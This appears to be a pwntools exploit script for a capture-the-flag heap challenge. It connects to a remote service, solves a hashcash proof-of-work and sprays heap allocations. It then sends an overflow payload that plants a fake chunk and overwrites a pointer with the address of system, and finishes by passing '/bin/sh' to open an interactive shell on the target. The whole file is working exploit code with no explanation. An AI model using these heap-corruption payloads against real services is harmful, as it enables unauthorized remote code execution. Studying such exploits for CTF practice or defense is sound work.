#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import time

#p = process("../bin/null")
#p = remote("47.75.57.242", 5000)
p = remote('47.98.50.73', 5000)

def PoW(chal, bits=28):
    output = subprocess.check_output(["hashcash", "-m", "-b", str(bits), chal])
    work = output.lstrip("hashcash stamp: ")
    return work

chal = p.recvuntil('\n', drop=True).split()
nbits = int(chal[4])
chall = chal[5]
work = PoW(chall, nbits)
print work
p.recvuntil(':')
p.sendline(work)

p.recvuntil("\n")
p.sendline("i'm ready for challenge")

def alloc(padblock, size):
    p.recvuntil('Action:')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(str(padblock))
    p.recvuntil(':')
    p.sendline('0')

for i in xrange(12):
    alloc(1000, 0x4000)
alloc(261, 0x4000)

fake_one = 0x602025 - 8
size = 0x3d00
p.recvuntil('Action:')
p.sendline('1')
p.recvuntil('Size: ')
p.sendline(str(size))
p.recvuntil(':')
p.sendline('0')
p.recvuntil('(0/1):')
p.sendline('1')
p.recvuntil('Input: ')
p.send((size-1)*'\xff')
print "Send fragmented packets...."
time.sleep(5)
payload = (0x420-223) * '\xcc'
payload += p32(0) + p32(0) + p64(0) * 5 + p64(fake_one)
payload = payload.ljust(0x600, '\x00')
p.send(payload)
time.sleep(3)

system = 0x400978
size = 0x60
p.recvuntil('Action:')
p.sendline('1')
p.recvuntil('Size: ')
p.sendline(str(size))
p.recvuntil(':')
p.sendline('0')
p.recvuntil('(0/1):')
p.sendline('1')
p.recvuntil('Input: ')
payload = '/bin/sh'.ljust(11, '\x00') + p64(system)
payload = payload.ljust(0x60)
p.send(payload)

p.interactive()
